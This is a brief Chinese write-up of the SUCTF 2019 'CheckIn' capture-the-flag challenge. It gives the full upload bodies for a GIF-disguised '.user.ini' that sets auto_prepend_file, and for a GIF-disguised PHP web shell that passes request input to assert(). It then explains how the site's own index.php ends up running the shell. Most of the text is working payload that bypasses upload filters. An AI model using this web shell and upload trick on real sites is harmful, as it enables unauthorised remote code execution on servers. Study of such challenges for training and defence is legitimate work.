# [SUCTF 2019]CheckIn

## 知识点

`.user.ini`

`文件上传`

## 解题

上传`.user.ini`

```
Content-Disposition: form-data; name="fileUpload"; filename=".user.ini"
Content-Type: image/gif

GIF89a
auto_prepend_file=1.gif
```

上传`shell`

```
Content-Disposition: form-data; name="fileUpload"; filename="1.gif"
Content-Type: image/gif

GIF89a
<script language='php'>assert($_REQUEST[1]);</script>
```

最后使用同目录下的`index.php`文件运行`shell`

因为`.user.ini`会使当前目录下的所有`php`文件包含`auto_prepend_file`后的文件